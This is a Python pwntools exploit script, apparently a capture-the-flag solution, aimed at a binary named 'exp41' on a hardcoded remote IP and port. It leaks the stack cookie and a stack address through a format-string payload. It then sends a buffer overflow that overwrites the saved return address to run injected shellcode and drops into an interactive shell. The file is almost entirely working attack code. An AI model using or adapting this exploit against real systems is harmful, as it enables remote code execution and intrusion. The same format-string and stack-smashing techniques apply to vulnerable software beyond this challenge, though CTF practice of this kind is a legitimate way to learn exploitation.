#!/usr/bin/env python
# -*- coding: utf-8 -*-


from pwn import *
import re
import argparse
import subprocess
from binascii import *


context.update(arch='amd64')
BINARY_FILE = './exp41'
REMOTE = ('80.211.144.146', 34001)


def setup_connection():
    binary, libc, preload = None, None, False
    local_libc = '/lib/x86_64-linux-gnu/libc.so.6'
    task_libc = './libc.so.6'

    env = {}
    if args.PRELOAD:
        local_libc = task_libc
        env = {'LD_PRELOAD': task_libc}

    if args.BINARY:
        binary = ELF(BINARY_FILE)
        context.arch = binary.arch

    if args.REMOTE:
        if args.LIBC:
            libc = ELF(task_libc)
        s = remote(*REMOTE)
    else:
        if args.LIBC:
            libc = ELF(local_libc)
        
        s = process(BINARY_FILE, env=env)
        if args.GDB:
            context.terminal = ['gnome-terminal', '-e']
            breakpoints = [0x401248]
            gdb.attach(s, exe=BINARY_FILE, gdbscript='\n'.join(['b *'+str(x) for x in breakpoints]))
            
    return s, binary, libc


if __name__ == '__main__':
    s, binary, libc = setup_connection()

    shellcode = asm(shellcraft.amd64.sh())

    # leak
    payload = '%15$p.%19$p.'
    s.recvuntil('Next name, please\n')
    s.sendline(payload)
    s.recvuntil('Hello ')
    leak = s.recvuntil('.\n')[:-2]
    cookie, saved_rip = map(lambda x: int(x,16), leak.split('.'))
    saved_rip -= 0xe0
    log.info('Cookie value: {}'.format(hex(cookie)))
    log.info('Saved RIP addr: {}'.format(hex(saved_rip)))

    # shellcode
    s.recvuntil('Next name, please')
    payload = 'A' * (0x48 - 0x10)
    payload += p64(cookie)
    payload += p64(0x41424344)  # rbp
    payload += p64(saved_rip + 0x8)
    payload += asm('shr rsp,8\nshl rsp,8')
    payload += shellcode
    s.sendline(payload)

    # trigger
    s.sendline('exit')

    s.interactive()
    s.close()
